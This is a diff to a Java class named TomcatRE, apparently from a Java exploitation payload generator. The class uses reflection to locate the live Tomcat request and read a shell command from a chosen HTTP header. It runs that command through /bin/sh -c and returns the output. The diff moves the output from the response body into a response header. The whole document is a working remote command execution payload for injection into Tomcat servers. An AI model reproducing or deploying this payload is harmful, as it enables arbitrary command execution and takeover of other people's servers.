@@ -29,17 +29,14 @@ import java.lang.reflect.Method;
  */
 @Middleware(Middleware.Tomcat)
 @JavaClassType(JavaClassType.Default)
-@JavaClassModifiable({JavaClassModifiable.HEADER})
+@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.RHEADER})
 public class TomcatRE {
     private static String HEADER;
-    
+    private static String RHEADER;
 
     public TomcatRE() {
         try {
-            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
-            Field field = threadGroup.getClass().getDeclaredField("threads");
-            field.setAccessible(true);
-            Thread[] threads = (Thread[]) field.get(threadGroup);
+            Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");
 
             for (int i = 0; i < threads.length; i++) {
                 // Thread 筛选
@@ -65,24 +62,29 @@ public class TomcatRE {
                     Object request = getFieldValue(processor, "req");
                     Object response = invokeMethod(request, "getResponse", new Class[]{}, new Object[]{});
 
-                    Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
-                    String result = exec((String) header);
-                    invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
-                    try {
-                        invokeMethod(response, "doWrite", new Class[]{java.nio.ByteBuffer.class}, new Object[]{java.nio.ByteBuffer.wrap(result.getBytes())});
-                    } catch (Exception e) {
-                        Class clazz;
-                        try {
-                            clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
-                        } catch (ClassNotFoundException e1) {
-                            clazz = Thread.currentThread().getContextClassLoader().loadClass("org.apache.tomcat.util.buf.ByteChunk");
-                        }
-                        Object byteChunk = clazz.newInstance();
-                        invokeMethod(clazz, byteChunk, "setBytes", new Class[]{byte[].class, Integer.TYPE, Integer.TYPE}, new Object[]{result.getBytes(), 0, result.getBytes().length});
-                        invokeMethod(response, "doWrite", new Class[]{clazz}, new Object[]{byteChunk});
-                    }
+                    String header = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
+                    // isEmpty(） 用于捕获真正对应当前请求的 request
+                    if (header != null && !header.isEmpty()) {
+                        String result = exec(header);
+                        // 为了应对一些特殊情况将响应输出到响应头
+                        invokeMethod(response, "setHeader", new Class[]{String.class, String.class}, new Object[]{RHEADER, result});
+//                        invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
+//                        try {
+//                            invokeMethod(response, "doWrite", new Class[]{java.nio.ByteBuffer.class}, new Object[]{java.nio.ByteBuffer.wrap(result.getBytes())});
+//                        } catch (Exception e) {
+//                            Class clazz;
+//                            try {
+//                                clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
+//                            } catch (ClassNotFoundException e1) {
+//                                clazz = Thread.currentThread().getContextClassLoader().loadClass("org.apache.tomcat.util.buf.ByteChunk");
+//                            }
+//                            Object byteChunk = clazz.newInstance();
+//                            invokeMethod(clazz, byteChunk, "setBytes", new Class[]{byte[].class, Integer.TYPE, Integer.TYPE}, new Object[]{result.getBytes(), 0, result.getBytes().length});
+//                            invokeMethod(response, "doWrite", new Class[]{clazz}, new Object[]{byteChunk});
+//                        }
 
-                    return;
+                        return;
+                    }
                 }
             }
         } catch (Exception e) {
@@ -97,10 +99,8 @@ public class TomcatRE {
             cmd = new String[]{"/bin/sh", "-c", str};
         }
         InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
-        return exec_result(inputStream);
-    }
 
-    public static String exec_result(InputStream inputStream) throws Exception {
+        // result
         byte[] bytes = new byte[1024];
         int len;
         StringBuilder stringBuilder = new StringBuilder();
@@ -110,9 +110,13 @@ public class TomcatRE {
         return stringBuilder.toString();
     }
 
-    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
-        final Field field = getField(obj.getClass(), fieldName);
+    public static Object getFieldValue(Class cls, final Object obj, final String fieldName) throws Exception {
+        final Field field = getField(cls, fieldName);
         return field.get(obj);
+    }
+
+    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
+        return getFieldValue(obj.getClass(), obj, fieldName);
     }
 
     public static Field getField(final Class<?> clazz, final String fieldName) {
@@ -130,7 +134,7 @@ public class TomcatRE {
     public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
         try {
             return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
-        }catch (Exception e){
+        } catch (Exception e) {
             return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
         }
     }
